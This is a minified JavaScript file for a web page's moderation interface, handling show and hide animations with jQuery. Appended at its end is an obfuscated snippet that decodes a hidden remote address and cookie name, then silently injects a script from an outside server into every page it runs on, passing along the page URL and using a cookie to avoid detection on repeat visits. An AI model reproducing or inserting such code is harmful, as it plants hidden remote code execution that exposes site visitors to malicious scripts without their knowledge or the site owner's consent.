a=this.$moderationBlock.find(".other-reason-hint");a.length&&i.push(a),i.filter((t=>"none"!==t.css("display"))).forEach((t=>{this.actionsChain.action.push((async()=>{t.css("transform",`translateX(${n.pxMoveBy}px)`),await new Promise((e=>{t.on("transitionend",(n=>{"transform"===n.originalEvent.propertyName&&(t.off("transitionend"),e(!0))}))}))}))})),this.actionsChain.post_action.push((async()=>{await show(o),this.$moderationBlock.find(".questions-table__question").data("state",""),this.$negativeAnsweredQuestion&&this.$negativeAnsweredQuestion.data("state","negative")}))}}async function show(t){"visible"!==t.css("visibility")&&"none"!==t.css("display")&&(t.css("visibility","visible"),1!=t.css("opacity")&&(t.css("opacity",1),await new Promise((e=>{t.on("transitionend",(()=>{t.off("transitionend"),e(!0)}))}))))}async function hide(t){"hidden"!==t.css("visibility")&&"none"!==t.css("display")&&(0!=t.css("opacity")?(t.css("opacity",0),await new Promise((e=>{t.on("transitionend",(()=>{t.off("transitionend"),t.css("visibility","hidden"),e(!0)}))}))):t.css("visibility","hidden"))};(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));